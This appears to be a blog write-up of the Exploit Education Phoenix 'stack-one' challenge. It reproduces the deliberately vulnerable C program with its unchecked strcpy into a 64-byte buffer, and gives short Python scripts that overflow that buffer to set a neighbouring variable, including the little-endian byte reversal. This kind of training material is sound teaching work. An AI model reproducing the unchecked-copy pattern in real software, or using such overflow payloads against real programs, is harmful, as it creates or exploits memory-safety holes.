---
title: Exploit Education > Phoenix > Stack-One
date: '2021-09-25'
draft: false
---

Stack-One is an ASCII challenge. It's described by the following C code:

```
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

When looking at the code, the following line catches the eye immediately:

```
strcpy(locals.buffer, argv[1]);
```

Our `main` function uses `strcpy` without validating our inputs size first! If we look at our `locals` struct (of which `buffer` is strcpy's destination), we can see that it also contains the volatile `changeme` variable.

```
struct {
    char buffer[64];
    volatile int changeme;
  } locals;
```



The goal of this challenge is to change `changeme` to `0x496c5962`. The solution to this exercise is similar to the one we used for `Stack-Zero`: We write 64 characters into `argv` at the start of the program and `0x496c5962` after that. We want to write the actual number `0x496c5962` into `changeme`, but our terminal only provides us the with possibility to enter characters.

One solution for this is to convert `0x496c5962` into an ASCII string. Most ASCII characters fall into a range between 0 and 255, a.k.a 2 to the power of 8 possible characters, or one byte. Since a single hex digit stores 4 bit of information, we split `0x496c5962` into small packets for two digits each. This leaves us with `0x49` `0x6c` `0x59` and `0x62`. Translate that into human readable ASCII characters and you get `IlYb`.

To solve this challenge, we need to pipe 64 characters into `argv` to pad the buffer into overflowing and `IlYb` to set `changeme` to `0x496c5962`. To do this in an easy way, we can yet again use python for our needs:

```
# stack-one.py

padding = '0' * 64
changeme = 'IlYb'

print(padding + changeme)
```

Note that in python, instead of converting a known string of numbers to ASCII characters, we could just print bytes instead!

```
# stack-one.py

padding = '0' * 64
changeme = '\x49\x6c\x59\x62'

print(padding + changeme)
```



Calling `./stack-one $(python3 stack-one.py)` should print the following message:
`> Well done, you have successfully set changeme to the correct value`

```
> ./stack-one $(python3 stack-one.py)

> Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
```

Huh. Seems like we did indeed change `changeme`, but it's value is *reversed*. To understand what's actually going on here, we have too take yet another look at `Stack-One`'s description:

*Having troubles? How does the endianness of the architecture affect the layout of how variables are laid out?*

Since we are on an x86 linux system, we know that we're using `little-endian`. The following image explains the difference in storage layout:

![Endianness[width=50%]](/Endianness.png)

Values in `little-endian` seem to be *reversed* compared to how a human would naturally read them. To spare programmers the pain of having to write values reversed if their host system is little endian, compilers automatically look up if their system is little endian and emit any value in the approriate format. If we changed `changeme` to `0x496c5962` *inside* `stack-zero-c` and compiled it via `gcc`, our compiler would write it as `0x62596c49` *in memory*, pointing to its "end" `0x49` as the first value.

Our mistake immediately becomes clear: We naturally write our target value 0x496c5962 from left to right into `stack-one`'s arguments. When its `main` function stores the `argv[1]` value in `locals.buffer`, causing a buffer overflow, it writes `0x496c5962` into `changeme`'s memory location *without any compiler intervention*. In memory, `changeme` reads `0x496c5962` but is read from right to left because our system is little-endian. To correct for this, we just have to reverse `0x496c5962` so it fits inside memory in the correct way.

This can be achieved by changing our little python snippet accordingly:
```
# stack-one.py

padding = '0' * 64;
changeme = 'IlYb'[::-1] # short syntax for reversing a string

print(padding + changeme)
```

Using our newly adjusted script, we can see that we successfully solved this challenge!

```
> ./stack-one $(python3 stack-one.py)

> Well done, you have successfully set changeme to the correct value
```
